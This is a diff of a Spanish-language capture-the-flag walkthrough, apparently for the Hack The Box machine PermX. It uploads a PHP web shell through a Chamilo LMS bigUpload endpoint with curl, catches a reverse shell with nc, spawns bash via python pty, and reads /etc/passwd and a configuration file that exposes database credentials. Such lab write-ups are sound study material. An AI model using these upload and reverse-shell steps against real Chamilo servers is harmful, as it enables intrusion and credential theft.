@@ -62,20 +62,22 @@ sudo nmap -sS -sV -A --min-rate 5000 --open -vvv -Pn 10.10.11.23
 - Descargamos la shell
 - La enviamos al servidor 
 
-curl -F 'bigUploadFile=@sheel.php' 'http://lms.permx.htb//main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported' 
+> curl -F 'bigUploadFile=@sheel.php' 'http://lms.permx.htb//main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported' 
 
 - Nos colocamos en escucha
 
 | nc |
+|----|
 | sudo nc -lvnp 9001 |
 
 - Ejecutamos la Revershell
 
-curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/sheel.php'
+> curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/sheel.php'
 
 - Ingresamos al servidor y importamos una libreria de python para obtener una bash
 
 | importamos bash |
+|-----------------|
 | python3 -c 'import pty;pty.spawn("/bin/bash")' |
 
 
@@ -83,4 +85,30 @@ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/sheel.php'
 
 > cat /etc/passwd | grep -i sh$
 
+|resultados|
+|----------|
+| root:x:0:0:root:/root:/bin/bash|
+|mtz:x:1000:1000:mtz:/home/mtz:/bin/bash |
 
+- Realizamos una busqueda por ficheros
+
+> find ./ | grep “configuration.php” 2>dev/null 
+
+
+- Dentro de la busqueda encontramos la siguiente linea 
+
+
+> cat ./var/www/chamilo/app/config/configuration.php 
+
+
+- Esto nos da resultados de la configuracion de la base de datos
+//
+Database connection settings.
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['main_database'] = 'chamilo';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+Enable access to database management for platform admins.
+$_configuration['db_manager_enabled'] = false;
+//
